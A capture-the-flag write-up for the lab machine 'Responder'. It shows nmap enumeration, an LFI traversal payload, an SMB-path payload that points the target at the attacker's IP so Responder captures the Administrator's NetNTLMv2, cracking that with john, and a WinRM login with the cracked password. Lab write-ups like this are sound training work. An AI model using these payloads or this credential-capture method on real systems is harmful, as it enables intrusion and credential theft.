# Responder

- TL;DR: 

## Enumeration

- Run an nmap scan:
```
nmap -p- --min-rate=5000 -sV 10.129.44.44
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 21:07 PDT
Nmap scan report for 10.129.44.44
Host is up (0.094s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.62 seconds
```

<br>

- From the scan results we find:
    - Web server running on port `80/tcp`
    - WinRM running on port `5985/tcp`

<br>

## Web Enumeration

- We try to visit the following target url `http://10.129.44.44` in the web browser, the browser returns a message about being unable to find the site.
- The url in the browser changes to `http://unika.htb/`. The website has redirected the browser to a new URL, and our host does not know how to find `unika.htb`.
- This is because the web server is employing name-based Virtual Hosting for serving the requests (It is a method for hosting multiple domain names with separate handling of each name on a single server).
- The web server checks the `Host` header field of the HTTP request and sends a response according to that. 
- The `/etc/hosts` file is used to resolve a hostname into an IP address & thus we will need to add an entry in the `etc/hosts` file for this domain to enable the browser to resolve the address for `unika.htb`.
- We can run `echo "10.129.44.44 unika.htb" | sudo tee -a /etc/hosts` to add the entry to the file.
- This will enable the browser to resolve the hostname `unika.htb` to the corresponding IP address & thus make the browser include the HTTP header `Host: unika.htb` in every HTTP request that the browser sends to this IP address, which will make the server respond with the webpage for `unika.htb`.
- On accessing the web page we are no presented with a web designing business landing page.
- Nothing is of particular interest. However, we are able to change the lanugage from `EN` to `FR` in the nav bar.
- Switching to the `FR` we see that the `french.html` page is being loaded by the `page` parameter, which may be potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.

<br>

## File Inclusing Vulnerability

- LFI: occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input.
- If application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the `../` string in the inputted file name and eventually view sensitive files in the local file system. In some limited case LFI can lead to code execution as well.
- RFI: Similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.
- We test the `page` parameter to see if we can include files on the target system in the server response. We will test with some commonly known files that will have the same name across networks, Windows domains, and systems which can be found [here](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).
- One of the most common file names that is used to test LFI is `WINDOWS\System32\drivers\etc\hosts`.
- The `../` string is used to traverse back a directory, one at a time.
- By visiting the following URL `http://unika.htb/index.php?page=../../windows/system32/drivers/etc/hosts` we are able to confirm that LFI is possible since we get the output of the `/etc/hosts` file on the remote server.
- The LFI was made possible because in the backend the `include()` method of PHP is being used to process the URL parameter `page` for serving webpage for different languages. And because no proper sanitization is being done on this `page` parameter, we were able to pass malicious input and therefore view the internal system files.
- What is the `include()` method in PHP?
    - The `inlcude` statement takes all the text/code/markup that exists in the specified file and loads in into the memory, making it available for use.
    ```
    File 1 --> vars.php
    
    <?php
        $color = 'green';
        $fruit = 'apple';
    ?>

    #############################################
    File 2 --> test.php
    
    <?php
        echo "A $color $fruit"; // output = "A"
        include 'vars.php';
        echo "A $color $fruit"; // output = "A green apple"
    ?>
    ```

<br>

## Responder Challenge Capture

- Since the web page is vulnerable to the file inclusion vulnerability and is being served on a Windows machine, there exists a potential for including a file on our attacker workstation. If we select a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the `NetNTLMv2`.

- What is NTLM (New Technology Lan Manager)?
    - NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a response on an Active Directory domain.
    - It is a type of single sign on (SSO) because it allows the user to provide the underlying authentication factor only once, at login.
    - The NTLM authentication process is done the following way:
        1. The client sends the username and the domain name to the server.
        2. The server generates a random character string, refered to as the challenge.
        3. The client encryptes the challenge with the NTLM hash of the user password and sends it back to the server.
        4. The server retrieves the user password (or equivilent).
        5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the value matches, the client is authenticated.

<br>

## NTLM vs NTHash vs NetNTLMv2

- An NTHash is the output of the algorithm used to store passwords on Windows systems on the SAM database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an NTLM.
- When the NTLM protocol wants to do authentiction over the network, it uses a challenge/response model as described above. A NetNTLMv2 challenge/response is a string specifically formatted to include the challenge and response. This is often referred to as a NetNTLMv2 hash, but is not actually a hash. Still it is regularly referred to as a hash because we attack it in the same manner. You'll see NetNTLMv2 objects referred to as NTLMv2, or even confusing as NTLM.

<br>

## Using Responder

- In the PHP configuration file `php.ini`, `allow_url_include` wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if `allowed_url_include` and `allow_url_fopen` are set to "Off", PHP will not prevent the loading of SMB URLs. In our case we can misuse this functionality to steal the NTLM hash.
- Using the example from [this link](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#lfi) we can attempt to load a SMB URL, and in that process, we can capture the hashes from the target using Responder.

<br>

## How does Responder work?

- Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server.
- When the target machine attempts to perform the NTLM authentiction to the server, Responder sends a challenge back to the server to encrypt with the user's password. 
- When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2.
- While we can't reverse the NetNTLMv2, we can try many different common passowrds to see if any generate the same challenge-response, and if we find one we know that is the passsword. This is often referred to as hash cracking, which we'll do with a program called John The Ripper.
- We can clone the Responder utility with the following command:
    - `git clone https://github.com/lgandx/Responder`
- Verify that `Responder.conf` is set to listen for SMB requests.
    - `SMB = On`
- In case, any error is raised regarding not begin able to start TCP server on `port 80`, it is because `port 80` is already being used by another service on the machine. The error can be circumvented by altering the `Responder.conf` file to toggle off the "HTTP" entry which is listed under the "Servers to start" section.
- ```
    Location of Responder.conf file -
    -> for default system install : /usr/share/responder/Responder.conf
    -> for github installation : /installation_directory/Responder.conf
  ```
- Setting the "HTTP" flag to "Off" under the "Servers to start" section in the `Responder.conf` file:
   -  ```
        ; Servers to start
        SQL = On
        SMB = On
        RDP = On
        Kerberos = On
        FTP = On
        POP = On
        SMTP = On
        IMAP = On
        HTTP = On
        [** SNIP **]
      ```
- With the Responder server ready, we tell the server to include a resource from our SMB server by setting the `page` parameter as follows via the web browser.
    - `http://unika.htb/?page=//10.10.14.25/somefile`
- In this case, because we have the freedom to specify the address for the SMB share, we specify the IP address of our attacking machine. Now the server tries to load the resource from our SMB server, and Responder captures enough of that to get the NetNTLMv2.
- Note: Make sure to add `http://` in the address as some browsers might opt for a Google search instead of navigating to the appropriate page.
- After sending our paylod through the web browser we get an error about not being able to load the requested file.
- But checking our listening Responder server we can see we have a NetNTLMv for the Administrator user. The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

<br>

## Hash Cracking

- We can dump the hash into a file and attempt to crack it with `john`, which is a password hash cracking utility.
- We pass the hash file to `john` and crack the password for the Administrator account. The hash type is automatically identified by the `john` CLI.
- ```
    john -w=/usr/share/wordlists/rockyou.txt NetNTLMv2.txt

    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    badminton        (Administrator)     
    1g 0:00:00:00 DONE (2023-07-11 06:05) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed. 
  ```

  - We can see that john was able to crack the hash: `password: badminton`

<br>

## WinRM

- We'll connect to the WinRM service on the target and try to get a session. Since PowerShell isn't installed on Linux by default, we'll use a tool called [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).
- `evil-winrm -i 10.129.95.234 -u administrator -p badminton`
- Once connected to the remote host we can view the contents of the `flag.txt` file found under `C:\Users\mike\Desktop` using the `type flag.txt` command.